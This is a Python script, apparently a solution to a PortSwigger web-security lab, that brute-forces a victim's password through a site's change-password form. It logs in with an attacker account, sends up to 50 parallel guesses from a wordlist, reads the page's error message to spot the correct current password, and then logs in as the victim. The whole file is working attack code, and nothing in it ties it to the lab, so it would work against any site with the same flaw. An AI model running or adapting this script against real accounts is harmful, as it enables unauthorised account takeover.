from requests import request
from bs4 import BeautifulSoup
from random import randint
from io import FileIO
from concurrent.futures import ThreadPoolExecutor,as_completed
from sys import argv

class UnreadableFile(Exception):
    pass


def read_wordlist(path_to_wordlist):
    try:
        wordlist_file = FileIO(path_to_wordlist)
        if wordlist_file.readable():
            wordlist_file_contents = wordlist_file.read().decode()
            wordlist = wordlist_file_contents.split("\n")
            while wordlist.count("\n") > 0:
                wordlist.remove("\n")
            while wordlist.count("") > 0:
                wordlist.remove("")
            return wordlist
        else:
            raise UnreadableFile("Not Able to Read File {}".format(wordlist_file.name))
    except UnreadableFile as exception:
        print("Error : {}".format(exception))
        exit(1)
    except Exception as exception:
        print("Error : {}".format(exception))
        exit(1)


def parse_cookie(cookies):
    try:
        parsed_cookies = ""

        for key, value in cookies.items():
            parsed_cookies = "{}{}={};".format(parsed_cookies, key, value)

        return parsed_cookies
    except Exception as exception:
        print("[-] Error While Parse Cookies : {} ".format(exception))


def generate_random_ip():
    ip = "{}.{}.{}.{}".format(
        randint(1, 255), randint(0, 255), randint(0, 255), randint(0, 255)
    )
    return ip


def request_logger(method, endpoint, data=""):
    print("{} {} {}".format(method, endpoint, data))

def login(login_url,username,password):
    try:
        data="username={}&password={}".format(username,password)
        request_logger("POST",login_url,data)
        res=request(method="POST",url=login_url,data=data);
        res_html=BeautifulSoup(res.content.decode(),'html.parser')
        if res_html.find('div',{'id':'account-content'}):
            return parse_cookie(res.history[0].cookies)
        else:
            return False
    except Exception as exception:
        print("Error : {}".format(exception))
        return False

def generate_random_password():
    rand_password=""
    for i in range(0,8):
        rand_password="{}{}".format(rand_password,randint(65,100).to_bytes().decode('ascii'))
    return rand_password

def change_password_worker(change_pass_url,attacker_cookie,victim_username,victim_password):
    try:
        headers={
            "Cookie":attacker_cookie
        }
        data="username={}&current-password={}&new-password-1={}&new-password-2={}".format(victim_username,victim_password,generate_random_password(),generate_random_password())
        print("[!] Trying => {}:{}".format(victim_username,victim_password))
        res=request(method="POST",url=change_pass_url,headers=headers,data=data)
        res_html=BeautifulSoup(res.content.decode(),'html.parser')
        if res_html.find("p",{"class":"is-warning"}):
            if res_html.find("p",{"class":"is-warning"}).contents[0]=='Current password is incorrect':
                return False
            else:
                return {"username":victim_username,"password":victim_password}
        else:
            return {"username":victim_username,"password":victim_password}
    except :
        print("[+] Retrying")
        change_password_worker(change_pass_url,attacker_cookie,victim_username,victim_password)

        
def bruteforce_change_password_url(change_pass_url,attacker_cookie,victim_username,password_list):
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_login={}
        for password in password_list:
            future=executor.submit(change_password_worker,change_pass_url,attacker_cookie,victim_username,password)
            future_to_login[future]=future
        for future in as_completed(future_to_login):
            if future.result():
                executor.shutdown(wait=False)
                for other_future in future_to_login.keys():
                    other_future.cancel()
                return future.result()
        return {}

def pwn(lab_url,attacker_username,attacker_password,victim_username,path_to_wordlist):
    try:
        if lab_url[-1]!='/':
            lab_url="{}/".format(lab_url)
        
        attacker_cookie=login("{}login".format(lab_url),attacker_username,attacker_password)
        password_list=read_wordlist(path_to_wordlist)
        result = bruteforce_change_password_url("{}my-account/change-password".format(lab_url),attacker_cookie,victim_username,password_list)
        if result:
            print('[+] Cracked with Username : {} , Password : {}'.format(result.get('username') ,result.get('password')))
            if login("{}login".format(lab_url),result.get('username') ,result.get('password')):
                print("[+] Lab Solved")
            else:
                print("[-] Lab Wasn,t Solved")
        else:
            print("[-] Failed ")
    except Exception as exception:
        print("Error : {}".format(exception))
if __name__ == "__main__":
 print("""
        0xCrypt00o Solution for Portswigger LAB : Password-Bruteforce-Via-Password-Change
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==6:
     pwn(argv[1],argv[2],argv[3],argv[4],argv[5])
 else:
     print("call it with : ./pwn-auth-password-bruteforce-via-password-change.py  <url> <attacker username> <attacker password> <victim_username> <pass to password_list> ")

